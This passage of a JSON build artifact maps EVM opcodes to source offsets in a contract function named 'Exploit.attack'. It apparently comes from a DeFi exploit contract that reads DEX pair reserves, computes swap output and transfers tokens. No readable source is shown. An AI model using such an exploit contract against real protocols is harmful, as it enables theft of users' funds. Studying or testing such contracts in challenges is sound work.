    "4132": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4133": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5118
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x102E"
    },
    "4136": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5118
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4137": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5118
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4138": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5118
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13EA"
    },
    "4141": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        5084,
        5118
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4142": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5118
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4143": {
      "fn": "Exploit.attack",
      "offset": [
        5064,
        5118
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4144": {
      "fn": "Exploit.attack",
      "offset": [
        5064,
        5118
      ],
      "op": "POP",
      "path": "0"
    },
    "4145": {
      "fn": "Exploit.attack",
      "offset": [
        5129,
        5141
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4147": {
      "fn": "Exploit.attack",
      "offset": [
        5143,
        5155
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4148": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x11"
    },
    "4150": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4152": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4153": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4154": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4155": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x100"
    },
    "4158": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "EXP",
      "path": "0"
    },
    "4159": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4160": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "DIV",
      "path": "0"
    },
    "4161": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4163": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4165": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4167": {
      "op": "SHL"
    },
    "4168": {
      "op": "SUB"
    },
    "4169": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5171
      ],
      "op": "AND",
      "path": "0"
    },
    "4170": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4172": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4174": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4176": {
      "op": "SHL"
    },
    "4177": {
      "op": "SUB"
    },
    "4178": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5183
      ],
      "op": "AND",
      "path": "0"
    },
    "4179": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5183
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x902F1AC"
    },
    "4184": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4186": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4187": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4188": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "4193": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "AND",
      "path": "0"
    },
    "4194": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "4196": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "SHL",
      "path": "0"
    },
    "4197": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4198": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4199": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4201": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "ADD",
      "path": "0"
    },
    "4202": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "4204": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4206": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4207": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4208": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4209": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "SUB",
      "path": "0"
    },
    "4210": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4211": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4212": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "GAS",
      "path": "0"
    },
    "4213": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "4214": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4215": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4216": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4217": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1086"
    },
    "4220": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4221": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4222": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4224": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4225": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4226": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4227": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4229": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4230": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4231": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "POP",
      "path": "0"
    },
    "4232": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "POP",
      "path": "0"
    },
    "4233": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "POP",
      "path": "0"
    },
    "4234": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "POP",
      "path": "0"
    },
    "4235": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4237": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4238": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4239": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4241": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "NOT",
      "path": "0"
    },
    "4242": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4244": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4245": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "ADD",
      "path": "0"
    },
    "4246": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "AND",
      "path": "0"
    },
    "4247": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4248": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "ADD",
      "path": "0"
    },
    "4249": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4250": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4252": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4253": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "POP",
      "path": "0"
    },
    "4254": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4255": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "ADD",
      "path": "0"
    },
    "4256": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4257": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x10AA"
    },
    "4260": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4261": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4262": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1376"
    },
    "4265": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        5161,
        5185
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4266": {
      "fn": "Exploit.attack",
      "offset": [
        5161,
        5185
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4267": {
      "op": "POP"
    },
    "4268": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5256
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x12"
    },
    "4270": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5256
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4271": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4273": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4274": {
      "op": "PUSH4",
      "value": "0x1535435"
    },
    "4279": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "4281": {
      "op": "SHL"
    },
    "4282": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4283": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4284": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4286": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4287": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "ADD",
      "path": "0"
    },
    "4288": {
      "op": "DUP8"
    },
    "4289": {
      "op": "SWAP1"
    },
    "4290": {
      "op": "MSTORE"
    },
    "4291": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4293": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4295": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "4297": {
      "op": "SHL"
    },
    "4298": {
      "op": "SUB"
    },
    "4299": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "4300": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4301": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "AND",
      "path": "0"
    },
    "4302": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4304": {
      "op": "DUP3"
    },
    "4305": {
      "op": "ADD"
    },
    "4306": {
      "op": "DUP2"
    },
    "4307": {
      "op": "SWAP1"
    },
    "4308": {
      "op": "MSTORE"
    },
    "4309": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "4310": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4311": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "4312": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "AND",
      "path": "0"
    },
    "4313": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "4315": {
      "op": "DUP4"
    },
    "4316": {
      "op": "ADD"
    },
    "4317": {
      "op": "DUP2"
    },
    "4318": {
      "op": "SWAP1"
    },
    "4319": {
      "op": "MSTORE"
    },
    "4320": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "4321": {
      "op": "POP"
    },
    "4322": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4323": {
      "fn": "Exploit.attack",
      "offset": [
        5128,
        5185
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "4324": {
      "op": "POP"
    },
    "4325": {
      "fn": "Exploit.attack",
      "offset": [
        5211,
        5223
      ],
      "op": "DUP5",
      "path": "0"
    },
    "4326": {
      "fn": "Exploit.attack",
      "offset": [
        5211,
        5223
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4327": {
      "fn": "Exploit.attack",
      "offset": [
        5195,
        5208
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4329": {
      "fn": "Exploit.attack",
      "offset": [
        5195,
        5208
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4330": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4332": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4334": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4336": {
      "op": "SHL"
    },
    "4337": {
      "op": "SUB"
    },
    "4338": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5256
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4339": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5256
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4340": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5256
      ],
      "op": "AND",
      "path": "0"
    },
    "4341": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5256
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4342": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5269
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x54D50D4"
    },
    "4347": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5269
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4348": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "4350": {
      "op": "ADD"
    },
    "4351": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4353": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4355": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4356": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4357": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4358": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "SUB",
      "path": "0"
    },
    "4359": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4360": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4361": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "GAS",
      "path": "0"
    },
    "4362": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "4363": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4364": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4365": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4366": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x111B"
    },
    "4369": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4370": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4371": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4373": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4374": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4375": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4376": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4378": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4379": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4380": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "POP",
      "path": "0"
    },
    "4381": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "POP",
      "path": "0"
    },
    "4382": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "POP",
      "path": "0"
    },
    "4383": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "POP",
      "path": "0"
    },
    "4384": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4386": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4387": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4388": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4390": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "NOT",
      "path": "0"
    },
    "4391": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4393": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4394": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "ADD",
      "path": "0"
    },
    "4395": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "AND",
      "path": "0"
    },
    "4396": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4397": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "ADD",
      "path": "0"
    },
    "4398": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4399": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4401": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4402": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "POP",
      "path": "0"
    },
    "4403": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4404": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "ADD",
      "path": "0"
    },
    "4405": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4406": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x113F"
    },
    "4409": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4410": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4411": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C6"
    },
    "4414": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        5250,
        5301
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4415": {
      "fn": "Exploit.attack",
      "offset": [
        5250,
        5301
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4416": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 20,
      "value": "0x4"
    },
    "4418": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4419": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4420": {
      "fn": "Exploit.attack",
      "offset": [
        5335,
        5345
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x11"
    },
    "4422": {
      "fn": "Exploit.attack",
      "offset": [
        5335,
        5345
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4423": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4425": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4426": {
      "op": "PUSH4",
      "value": "0xA9059CBB"
    },
    "4431": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4433": {
      "op": "SHL"
    },
    "4434": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4435": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4436": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4438": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4440": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4442": {
      "op": "SHL"
    },
    "4443": {
      "op": "SUB"
    },
    "4444": {
      "fn": "Exploit.attack",
      "offset": [
        5335,
        5345
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4445": {
      "fn": "Exploit.attack",
      "offset": [
        5335,
        5345
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4446": {
      "fn": "Exploit.attack",
      "offset": [
        5335,
        5345
      ],
      "op": "AND",
      "path": "0"
    },
    "4447": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "4448": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4449": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "ADD",
      "path": "0"
    },
    "4450": {
      "op": "SWAP4"
    },
    "4451": {
      "op": "SWAP1"
    },
    "4452": {
      "op": "SWAP4"
    },
    "4453": {
      "op": "MSTORE"
    },
    "4454": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4456": {
      "op": "DUP4"
    },
    "4457": {
      "op": "ADD"
    },
    "4458": {
      "op": "DUP7"
    },
    "4459": {
      "op": "SWAP1"
    },
    "4460": {
      "op": "MSTORE"
    },
    "4461": {
      "fn": "Exploit.attack",
      "offset": [
        5233,
        5301
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "4462": {
      "fn": "Exploit.attack",
      "offset": [
        5233,
        5301
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "4463": {
      "op": "POP"
    },
    "4464": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4465": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4466": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4467": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "AND",
      "path": "0"
    },
    "4468": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5317
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4469": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5326
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xA9059CBB"
    },
    "4474": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5326
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4475": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "4477": {
      "op": "ADD"
    },
    "4478": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4480": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4482": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4483": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4484": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4485": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "SUB",
      "path": "0"
    },
    "4486": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4487": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4489": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "DUP8",
      "path": "0"
    },
    "4490": {
      "fn": "Exploit.attack",
      "offset": [
        5312,
        5357
      ],
      "op": "GAS",
      "path": "0"
    },
    "4491": {
      "fn": "Exploit.attack",
